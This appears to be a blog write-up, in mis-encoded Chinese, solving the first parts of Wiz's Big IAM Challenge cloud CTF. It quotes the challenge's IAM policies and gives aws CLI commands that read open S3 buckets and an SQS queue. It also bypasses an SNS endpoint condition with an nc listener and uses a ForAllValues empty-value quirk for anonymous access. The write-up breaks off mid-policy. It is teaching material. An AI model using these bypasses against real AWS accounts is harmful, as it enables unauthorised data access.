<h4 id="1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"><a href="#1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™" class="headerlink" title="1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"></a>1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…è®¸æ‰€æœ‰ç”¨æˆ·å¯¹s3å­˜å‚¨æ¡¶thebigiamchallenge-storage-9979f4b&#x2F;*ä¸‹æ‰€æœ‰æ–‡ä»¶è¿›è¡Œä¸‹è½½</li>
<li>å…è®¸æ‰€æœ‰ç”¨æˆ·å¯¹s3å­˜å‚¨æ¡¶thebigiamchallenge-storage-9979f4b&#x2F;files&#x2F;ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶è¿›è¡Œåˆ—ä¸¾</li>
</ul>
<h4 id="1-2-æ ¹æ®è¿™äº›æƒé™æˆ‘ä»¬å…ˆåˆ—ä¸¾thebigiamchallenge-storage-9979f4b-files-ä¸‹çš„æ–‡ä»¶"><a href="#1-2-æ ¹æ®è¿™äº›æƒé™æˆ‘ä»¬å…ˆåˆ—ä¸¾thebigiamchallenge-storage-9979f4b-files-ä¸‹çš„æ–‡ä»¶" class="headerlink" title="1.2 æ ¹æ®è¿™äº›æƒé™æˆ‘ä»¬å…ˆåˆ—ä¸¾thebigiamchallenge-storage-9979f4b&#x2F;files&#x2F;ä¸‹çš„æ–‡ä»¶"></a>1.2 æ ¹æ®è¿™äº›æƒé™æˆ‘ä»¬å…ˆåˆ—ä¸¾thebigiamchallenge-storage-9979f4b&#x2F;files&#x2F;ä¸‹çš„æ–‡ä»¶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span>  s3://thebigiamchallenge-storage-9979f4b/files/</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402110453022.png" alt="image-20240402110453022"></p>
<h4 id="1-3-æŸ¥çœ‹åˆ°flag-txtï¼Œç„¶åæˆ‘ä»¬å°†è¯¥æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¯å†™ç›®å½•å¹¶æŸ¥çœ‹"><a href="#1-3-æŸ¥çœ‹åˆ°flag-txtï¼Œç„¶åæˆ‘ä»¬å°†è¯¥æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¯å†™ç›®å½•å¹¶æŸ¥çœ‹" class="headerlink" title="1.3 æŸ¥çœ‹åˆ°flag.txtï¼Œç„¶åæˆ‘ä»¬å°†è¯¥æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¯å†™ç›®å½•å¹¶æŸ¥çœ‹"></a>1.3 æŸ¥çœ‹åˆ°flag.txtï¼Œç„¶åæˆ‘ä»¬å°†è¯¥æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¯å†™ç›®å½•å¹¶æŸ¥çœ‹</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag</span><br><span class="line"><span class="built_in">ls</span> /tmp</span><br><span class="line"><span class="built_in">cat</span> /tmp/flag</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402110616081.png" alt="image-20240402110616081"></p>
<h2 id="2-ç¬¬äºŒéƒ¨åˆ†"><a href="#2-ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="2. ç¬¬äºŒéƒ¨åˆ†"></a>2. ç¬¬äºŒéƒ¨åˆ†</h2><h3 id="Google-Analytics-è°·æ­Œåˆ†æ"><a href="#Google-Analytics-è°·æ­Œåˆ†æ" class="headerlink" title="Google Analytics è°·æ­Œåˆ†æ"></a>Google Analytics è°·æ­Œåˆ†æ</h3><p>We created our own analytics system specifically for this challenge. We think itâ€™s so good that we even used it on this page. What could go wrong?</p>
<p>Join our queue and get the secret flag.</p>
<h4 id="1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-1"><a href="#1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-1" class="headerlink" title="1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"></a>1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;sqs:SendMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…è®¸æ‰€æœ‰ç”¨æˆ·å‘arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2å‘é€æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯</li>
</ul>
<h4 id="1-2-å°è¯•å‘é€æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯"><a href="#1-2-å°è¯•å‘é€æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯" class="headerlink" title="1.2 å°è¯•å‘é€æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯"></a>1.2 å°è¯•å‘é€æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯</h4><p>å‘é€ä¸€ä¸ªhelloæ¶ˆæ¯åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws sqs send-message --queue-url <span class="string">&quot;https://sqs.us-east-1.amazonaws.com/0922978513</span></span><br><span class="line"><span class="string">74/wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span> --message-body <span class="string">&quot;Hello, this is a test mes</span></span><br><span class="line"><span class="string">sage!&quot;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹åˆ°æ¶ˆæ¯çš„md5å’Œid</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402112658824.png" alt="image-20240402112658824"></p>
<p>å°è¯•æ¥æ”¶sqsæ¶ˆæ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws sqs receive-message --queue-url <span class="string">&quot;https://sqs.us-east-1.amazonaws.com/0922978</span></span><br><span class="line"><span class="string">51374/wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹åˆ°æ¶ˆæ¯å®Œæ•´ç»“æ„ï¼ŒåŒ…æ‹¬idã€åˆ é™¤æ ‡è¯†ç¬¦ã€æ¶ˆæ¯md5ã€è¯·æ±‚ä½“</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402112853316.png" alt="image-20240402112853316"></p>
<p>æ ¹æ®è¯·æ±‚ä½“è¿›å…¥URLè¿›è¡Œè®¿é—®å³è·å¾—flag</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402112951903.png" alt="image-20240402112951903"></p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><h3 id="Enable-Push-Notifications-èƒ½å¤Ÿæ¨é€é€šçŸ¥"><a href="#Enable-Push-Notifications-èƒ½å¤Ÿæ¨é€é€šçŸ¥" class="headerlink" title="Enable Push Notifications èƒ½å¤Ÿæ¨é€é€šçŸ¥"></a>Enable Push Notifications èƒ½å¤Ÿæ¨é€é€šçŸ¥</h3><p>We got a message for you. Can you get it?</p>
<h4 id="1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-2"><a href="#1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-2" class="headerlink" title="1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"></a>1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2008-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SNS:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;sns:Endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*@tbic.wiz.io&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…è®¸ä»»ä½•ç»ˆç«¯åœ°å€ä»¥ â€œ@tbic.wiz.ioâ€ ç»“å°¾çš„AWS ç”¨æˆ·è®¢é˜…æŒ‡å®šçš„ SNS ä¸»é¢˜</li>
</ul>
<h4 id="1-2-å°è¯•ä»ç»ˆç«¯åœ°å€è®¢é˜…SNSä¸»é¢˜"><a href="#1-2-å°è¯•ä»ç»ˆç«¯åœ°å€è®¢é˜…SNSä¸»é¢˜" class="headerlink" title="1.2 å°è¯•ä»ç»ˆç«¯åœ°å€è®¢é˜…SNSä¸»é¢˜"></a>1.2 å°è¯•ä»ç»ˆç«¯åœ°å€è®¢é˜…SNSä¸»é¢˜</h4><p>ä½†æ˜¯æˆ‘ä»¬å¦‚ä½•ç»•è¿‡ä»¥ â€œ@tbic.wiz.ioâ€ ç»“å°¾å‘¢ï¼Œäº‹å®ä¸Šæˆ‘ä»¬ä¸ä¸€å®šä»emailçš„æ–¹å¼è¿›è¡Œè®¢é˜…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡httpçš„æ–¹å¼è¿›è¡Œè®¢é˜…ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ncç›‘å¬httpç«¯å£ä»è€Œè·å–è®¢é˜…æ¶ˆæ¯ã€‚</p>
<p>è¿œç¨‹ä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>aws shellï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws sns subscribe --topic-arn <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNot</span></span><br><span class="line"><span class="string">ifications&quot;</span> --protocol http --notification-endpoint <span class="string">&quot;http://xx.xx.xx.xx:12345/@tb</span></span><br><span class="line"><span class="string">ic.wiz.io&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402114807053.png" alt="image-20240402114807053"></p>
<p>è¿œç¨‹ä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f2557c40cfa9296426473bebf11d61a4631e90d1a8e8a0c89c77f5f7889b5f3806f62c6e59f2fcb23e4f0860516a0fd89471bb435f88d8f9110069d9efede2fa53927c743c18502aa112d4a58ca5bcdd29e5eb600a0c37ede1492b9b437936c3bdcce0d84b70d23fa68be2b19767aa745b</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402114937180.png" alt="image-20240402114937180"></p>
<p>å†æ¬¡ç›‘å¬æœ€ç»ˆæ”¶åˆ°è®¢é˜…æ¶ˆæ¯</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402115100724.png" alt="image-20240402115100724"></p>
<h2 id="4-ç¬¬å››éƒ¨åˆ†"><a href="#4-ç¬¬å››éƒ¨åˆ†" class="headerlink" title="4. ç¬¬å››éƒ¨åˆ†"></a>4. ç¬¬å››éƒ¨åˆ†</h2><h3 id="Admin-only-ä»…é™ç®¡ç†å‘˜ï¼Ÿ"><a href="#Admin-only-ä»…é™ç®¡ç†å‘˜ï¼Ÿ" class="headerlink" title="Admin only? ä»…é™ç®¡ç†å‘˜ï¼Ÿ"></a>Admin only? ä»…é™ç®¡ç†å‘˜ï¼Ÿ</h3><p>We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?</p>
<h4 id="1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-3"><a href="#1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-3" class="headerlink" title="1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"></a>1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ForAllValues:StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;aws:PrincipalArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å…è®¸æ‰€æœ‰ç”¨æˆ·&#x2F;è§’è‰²å¯¹æŒ‡å®š S3 å­˜å‚¨æ¡¶ä¸­çš„æ‰€æœ‰å¯¹è±¡æ‰§è¡Œè·å–æ“ä½œï¼ˆå³ä¸‹è½½æ–‡ä»¶ï¼‰</li>
<li>å…è®¸æ‰€æœ‰ç”¨æˆ·&#x2F;è§’è‰²åˆ—å‡ºæŒ‡å®š S3 å­˜å‚¨æ¡¶ä¸­ä»¥ â€œfiles&#x2F;â€œ å¼€å¤´çš„å¯¹è±¡ï¼Œä½†è¦æ±‚æ“ä½œçš„ä¸»ä½“å¿…é¡»æ˜¯ IAM ç”¨æˆ· adminã€‚</li>
</ul>
<h4 id="1-2-å¤šå€¼ä¸Šä¸‹æ–‡è¿ç®—ç¬¦ForAllValues"><a href="#1-2-å¤šå€¼ä¸Šä¸‹æ–‡è¿ç®—ç¬¦ForAllValues" class="headerlink" title="1.2 å¤šå€¼ä¸Šä¸‹æ–‡è¿ç®—ç¬¦ForAllValues"></a>1.2 å¤šå€¼ä¸Šä¸‹æ–‡è¿ç®—ç¬¦ForAllValues</h4><p>è¿™ä¸ªForAllValuesæœ‰ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼Œå¦‚æœåŒ¹é…åˆ°çš„æ˜¯ç©ºå€¼ä¹Ÿä¼šè¿”å›trueï¼Œè¿™å°±å¯¼è‡´ä¸å¸¦èº«ä»½ä¿¡æ¯çš„ç”¨æˆ·è®¿é—®s3å­˜å‚¨æ¡¶è¶Šæƒçš„æƒ…å†µã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402120917492.png" alt="image-20240402120917492"></p>
<h4 id="1-3-å°è¯•ä¸å¸¦èº«ä»½ä¿¡æ¯è®¿é—®s3å­˜å‚¨æ¡¶"><a href="#1-3-å°è¯•ä¸å¸¦èº«ä»½ä¿¡æ¯è®¿é—®s3å­˜å‚¨æ¡¶" class="headerlink" title="1.3 å°è¯•ä¸å¸¦èº«ä»½ä¿¡æ¯è®¿é—®s3å­˜å‚¨æ¡¶"></a>1.3 å°è¯•ä¸å¸¦èº«ä»½ä¿¡æ¯è®¿é—®s3å­˜å‚¨æ¡¶</h4><p>ä½¿ç”¨â€“no-sign-requestå­—æ®µåŒ¿åè®¿é—®s3å­˜å‚¨æ¡¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402121448278.png" alt="image-20240402121448278"></p>
<p>æ¥ç€åŒç¬¬ä¸€éƒ¨åˆ†ä¸€æ ·å°†flagå†™å…¥æœ¬åœ°å¯å†™ç›®å½•å¹¶æŸ¥çœ‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/flag1</span><br><span class="line"><span class="built_in">cat</span> /tmp/flag1</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402121629110.png" alt="image-20240402121629110"></p>
<h2 id="5-ç¬¬äº”éƒ¨åˆ†"><a href="#5-ç¬¬äº”éƒ¨åˆ†" class="headerlink" title="5. ç¬¬äº”éƒ¨åˆ†"></a>5. ç¬¬äº”éƒ¨åˆ†</h2><h3 id="Do-I-know-you-æˆ‘çŸ¥é“ä½ å—ï¼Ÿ"><a href="#Do-I-know-you-æˆ‘çŸ¥é“ä½ å—ï¼Ÿ" class="headerlink" title="Do I know you?  æˆ‘çŸ¥é“ä½ å—ï¼Ÿ"></a>Do I know you?  æˆ‘çŸ¥é“ä½ å—ï¼Ÿ</h3><p>We configured AWS Cognito as our main identity provider. Letâ€™s hope we didnâ€™t make any mistakes.</p>
<h4 id="1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-4"><a href="#1-1-æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™-4" class="headerlink" title="1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™"></a>1.1 æˆ‘ä»¬æŸ¥çœ‹æ‹¥æœ‰çš„æƒé™</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;mobileanalytics:PutEvents&quot;</span><span 